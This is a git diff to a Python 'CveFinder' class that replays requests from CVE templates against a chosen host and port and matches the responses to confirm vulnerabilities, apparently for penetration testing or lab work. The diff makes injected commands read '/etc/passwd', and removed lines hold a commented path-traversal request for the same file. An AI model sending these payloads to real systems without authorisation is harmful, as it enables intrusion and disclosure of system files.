@@ -10,7 +10,7 @@ class CveFinder:
     potential_cves = []
     auxiliary_potential_cves = []
     priority_cves = []
-
+    positive_cves = []
     def __init__(self,technology,version):
         self.tech=technology
         self.version=version
@@ -70,11 +70,6 @@ class CveFinder:
             if word not in self.potential_cves:
                 self.potential_cves.append(word)
                 self.priority_cves.append(1)
-            # else:
-            #     for index in range(len(self.potential_cves)):
-            #         if self.potential_cves[index] == file:
-            #             self.priority_cves[index] += 1 #Increment the "priority"
-            #             break
     def __Increment_Priority(self,file):
         for index in range(len(self.potential_cves)):
             if self.potential_cves[index] == file:
@@ -91,10 +86,13 @@ class CveFinder:
                         print(cve_id + ":\t" + cve_yaml['info']['tags'])
                         print("PROPRITY: ", self.priority_cves[filepath_index])
             max_priority -=1
-    def Confirm_Vulnerabilities(self,network,hostname,port):#,ports,services):
+    def Confirm_Vulnerabilities(self,network,hostname,port,url):#,ports,services):
+        self.ip=network
+        self.port = port
         #using the requests from the yaml files and then comparing the output with the yaml file output to confirm
         #make 3 lists of vulns: confirmed valid, confirmed invalid, unconfirmed
         network = str(network)
+
         host = hostname
         max_priority = max(self.priority_cves)
         while max_priority > 1:
@@ -102,7 +100,7 @@ class CveFinder:
                 if self.priority_cves[filepath_index] == max_priority :
                     with open(self.potential_cves[filepath_index], "r") as stream:
                     
-                        try:
+                        try: # use http.client !
                             
                             cve_yaml=yaml.safe_load(stream) # to avoid vulns from untrusted inputs we use safe_load
                             request = cve_yaml['requests'][0]
@@ -128,6 +126,7 @@ class CveFinder:
                                             #headers = { "Host" : "Localhost"}
                                             response = requests.get(url)#,headers=headers)
                                             print("From %s we got response:\n%s\n\n\n\n" % (self.potential_cves[filepath_index],response.text))
+                                            
                                         elif method == "POST":
                                             headers = { "Host" : "localhost"}
                                             response = requests.post(url,headers=headers)
@@ -146,48 +145,51 @@ class CveFinder:
                                 raw = request['raw']                                
 
                                 for raw_element in raw:
+
+
                                     url = "http://" + network + ":" + port
                                     shorturl = network + ":" + port
+
+
+
                                     if re.search('^GET',raw_element):
                                         payload_raw = raw_element[4:]
 
-                                        payload = self.Replace_arguments(payload_raw,url,host,self.potential_cves[filepath_index])
-                                        # # Adding a payload
-                                        # payload = {"id": [1, 2, 3], "userId":1}
+                                        payload = self.Replace_arguments(payload_raw,url,host)#,self.potential_cves[filepath_index])
 
-                                        # # A get request to the API
-                                        # response = requests.get(url, params=payload)
-                                        headers = payload.split(" ",1)[1].split("\n")[1]
+                                        headers = payload.split(" ",1)[1].split("\n",1)[1]
                                         payload = payload.split(" ")[0]
-                                        print(payload)
-                                        response = self.Deliver_Get_Payload(shorturl,payload)
+                                        headers = self.__Get_Headers_Dict(headers)
+                                        response = self.Deliver_Get_Payload(shorturl,payload,headers)
 
-                                        print(matchers)
                                         bool_confirm = self.Match_Response(response,matchers)
 
                                         if bool_confirm == True:
-                                            print("From %s we confirmed CVE!\n\n\n" % self.potential_cves[filepath_index])
+                                            print("From %s we confirmed CVE!\n\n" % self.potential_cves[filepath_index])
+                                            print("\t->PAYLOAD{GET}: %s\n" % payload)
+                                            print("RESPONSE: %s" % response)
                                             self.positive_cves.append(self.potential_cves[filepath_index])
                                         else:
                                             print("From %s we could NOT confirm CVE!\n\n\n" % self.potential_cves[filepath_index])
-                                        #url += payload.split(" ")[0]
-                                        
-                                        # print(url)
-                                        # headers = { "Host" : "Localhost"}
-                                        # response = requests.get(url,headers=headers)
-                                        # print("From %s we got response:\n%s\n\n\n\n" % (self.potential_cves[filepath_index],response.text))
                                         
                                     elif re.search('^POST',raw_element):
                                         payload_raw = raw_element[5:]
-                                        payload = self.Replace_arguments(payload_raw,url,host,self.potential_cves[filepath_index])
+                                        payload = self.Replace_arguments(payload_raw,url,host)#,self.potential_cves[filepath_index])
                                         
-                                        print(payload)
-                                        url += payload.split(" ")[0]
-                                        new_payload = payload.split(" ",1)[1].split("\n")[1]
-                                        print(url)
-                                        headers = { "Host" : "localhost"}
-                                        response = requests.post(url,headers=headers)
-                                        print("From %s we got response:\n%s\n\n\n\n" % (self.potential_cves[filepath_index],response.text))
+                                        headers = payload.split(" ",1)[1].split("\n",1)[1]
+                                        payload = payload.split(" ")[0]
+                                        headers_new = self.__Get_Headers_Dict(headers) #AFTER HEADERS, WE GET DATA
+                                        data_new = self.__Get_Data_Dict(headers)
+                                        response = self.Deliver_Post_Payload(shorturl,payload,headers_new,data_new)
+                                        bool_confirm = self.Match_Response(response,matchers)
+
+                                        if bool_confirm == True:
+                                            print("From %s we confirmed CVE!\n\n" % self.potential_cves[filepath_index])
+                                            print("\t->PAYLOAD{POST}: %s\n" % payload)
+                                            print("RESPONSE: %s" % response)
+                                            self.positive_cves.append(self.potential_cves[filepath_index])
+                                        else:
+                                            print("From %s we could NOT confirm CVE!\n\n\n" % self.potential_cves[filepath_index])
                                     else:
                                         print("Error, method of request not supported for this one...")
 
@@ -204,23 +206,34 @@ class CveFinder:
                             print("\n\n\n")
             max_priority -=1
 
-    def Replace_arguments(self,payload,baseurl,hostname,cve_name):
+    def Replace_arguments(self,payload,baseurl,hostname):
         print(hostname)
         if "{{BaseURL}}" in payload:
             payload = payload.replace("{{BaseURL}}", baseurl)
         if "{{Hostname}}" in payload:
             payload = payload.replace("{{Hostname}}", hostname)
         if "{{cmd}}" in payload:
-            payload = payload.replace("{{cmd}}","echo " + cve_name)
+            #payload = payload.replace("{{cmd}}","echo " + cve_name) # or..
+            payload = payload.replace("{{cmd}}","cat /etc/passwd")
         if "{{Command}}" in payload:
-            payload = payload.replace("{{Command}}","echo " + cve_name)
+            payload = payload.replace("{{Command}}","cat /etc/passwd")
         return payload
     
-    def Deliver_Get_Payload(self,shorturl,payload):
+    def Deliver_Get_Payload(self,shorturl,payload,headers): #ADD HTTPS FUNCTIONALITY
+        conn = http.client.HTTPConnection(shorturl) 
+
+        conn.request("GET", payload,headers=headers)
+
+        res = conn.getresponse()
+        data = res.read()
+
+        return data.decode("utf-8")
+    
+    def Deliver_Post_Payload(self,shorturl,payload,headers,data): #ADD HTTPS FUNCTIONALITY
         conn = http.client.HTTPConnection(shorturl)
 
-        conn.request("GET", payload)
-
+        conn.request("POST", payload,headers=headers,body=data)
+        print(conn)
         res = conn.getresponse()
         data = res.read()
 
@@ -229,8 +242,9 @@ class CveFinder:
     def Match_Response(self,response,matchers): #matchers -> list
         matcher_count = 0
         for matcher in matchers[0]:
-            if matcher['type'] == 'regex': #if regex
-                regex = matcher['regex']
+            #print(matcher)
+            if matcher["type"] == "regex": #if regex
+                regex = matcher['regex'][0]
                 regex_res = re.findall(regex, response)
                 if regex_res:
                     matcher_count +=1
@@ -238,44 +252,50 @@ class CveFinder:
             return True
         else:
             return False
-
-
-        # for filepath in self.potential_cves:
-        #     with open(filepath, "r") as stream:
-        #         cve_yaml=yaml.safe_load(stream) # to avoid vulns from untrusted inputs we use safe_load
-        #         request = cve_yaml['requests'][0]
-        #         #print(request)
-        #         matchers_condition = request['matchers-condition']
-        #         matchers = request['matchers'] 
-        #         try:
-        #             method = request['method']
-        #             path = request['path']
-        #             print(method + " " + path)
-        #         except:
-        #             raw = request['raw']
-        #             print(raw)
-
-        #         print("\n\n\n")
-
-                #[{'type': 'word', 'part': 'body', 'words': ["javascript:alert('document.domain')", 'File Browser'], 'condition': 'and'}, 
-                # {'type': 'word', 'part': 'header', 'words': ['text/html']}, {'type': 'status', 'status': [200]}]
-                #print(matchers)
-                # type = request['type']
-                # print(type)
-
-
-# Cve_Finder = CveFinder('ShellShock','4.3') # was mojoPortal
-# Cve_Finder.Confirm_Vulnerabilities('127.0.0.1',"localhost")
-# Cve_Finder.Print_Potential_Cves()
-# Cve_Finder.Confirm_Vulnerabilities('10.10.11.189')
-
-# import http.client
-
-# conn = http.client.HTTPConnection("127.0.0.1:8088")
-
-# conn.request("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd")
-
-# res = conn.getresponse()
-# data = res.read()
-
-# print(data.decode("utf-8"))
+    def Print_Positive_CVEs(self):
+        if self.positive_cves:
+            for cve in self.positive_cves:
+                #cve_nice = cve.split("/")[2].split(".")[0]
+                print("The following host: %s\nTechnology: %s\nVersion: %s\nPort: %s\nVulnerable to %s\n" % (self.ip,self.tech,self.version,self.port,cve))
+        else:
+            print("The following host: %s\nTechnology: %s\nVersion: %s\nPort: %s\nNOT vulnerable to any of our CVE's\n" % (self.ip,self.tech,self.version,self.port,cve))
+    def __Get_Headers_Dict(self,headers):
+        headers_dict = {}
+        headers_list=headers.split("\n")
+        pause_found = False
+        for header in headers_list:
+            if header and not pause_found:
+                name = header.split(":",1)[0]
+                desc = header.split(":",1)[1].split(" ",1)[1]
+                if name in headers_dict.keys():
+                    headers_dict[name]= desc
+                else:
+                    headers_dict[name] = ""
+                    headers_dict[name] = desc
+            else:
+                pause_found = True
+                #break?
+        return headers_dict
+    
+    def __Get_Data_Dict(self,headers):
+        #We are looking for a pause before DATA
+        empty = ""
+        #data_dict = {}
+        data_list=headers.split("\n")
+        pause_found= False
+        for data in data_list:
+            if data and pause_found:
+                return data
+                # name = data.split(":",1)[0]
+                # desc = data.split(":",1)[1].split(" ",1)[1]
+                # if name in data_dict.keys():
+                #     data[name]= desc
+                # else:
+                #     data[name] = ""
+                #     data[name] = desc
+            else:
+                if data:
+                    continue
+                else:
+                    pause_found = True
+        return empty
